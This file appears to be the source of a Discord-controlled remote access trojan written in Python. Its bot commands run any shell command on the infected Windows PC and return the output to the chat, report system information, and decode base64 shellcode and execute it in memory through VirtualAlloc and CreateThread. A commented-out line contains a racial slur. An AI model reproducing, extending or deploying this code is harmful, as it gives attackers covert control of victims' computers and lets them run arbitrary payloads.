import subprocess
import pprint
import sys
import time
from discord import message
from Shell_Engine import *
from discord.ext import commands
import discord
import base64
import ctypes
import getpass
import os
import platform
import re
import socket
import subprocess
import urllib.request
import sys


bot = discord.Client()

token = ''

import string
import discord
import random
from discord import message
from discord.ext import commands
import logging

logger = logging.getLogger('discord')
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
logger.addHandler(handler)



description = '''yes'''

intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='!', description=description, intents=intents)


@bot.event
async def on_ready():
    print("-----------------------------------------------")
    print("[!] Iniciando seccion como: ", bot.user.name)
    print("[!] ID: ", bot.user.id)
    print("-----------------------------------------------")


@bot.command()
async def CMD(ctx, input: str):
    """executes commands on the pc"""
    comando = input
    b = subprocess.check_output(comando, shell=True)
    output = b.decode('cp1252')
    #if comando == "nslookup myip.opendns.com. resolver1.opendns.com":
        #await ctx.send("nigga")
    await ctx.send(output)

@bot.command()
async def c(ctx):
    """custom help message"""
    await ctx.send(help_message)


@bot.command()
async def sysm(ctx):
    """returns system information"""
    sysinfo = get_system_info()
    await ctx.send(sysinfo)

@bot.command()
async def shell(ctx, msg: str):
    """"""
    if "Windows" not in platform.system():
        return "[!] Currently this functionality is only available for Windows platforms."
    else:
        # based on Debasish Mandal's "Execute ShellCode Using Python"
        # http://www.debasish.in/2012/04/execute-shellcode-using-python.html
        shellcode = bytearray(base64.b64decode(msg))

        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                  ctypes.c_int(len(shellcode)),
                                                  ctypes.c_int(0x3000),
                                                  ctypes.c_int(0x40))

        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                             buf,
                                             ctypes.c_int(len(shellcode)))

        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(ptr),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))

        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
                                                   ctypes.c_int(-1))

        return "[*] Shellcode (%d bytes) executed in memory." % len(shellcode)

bot.run(token)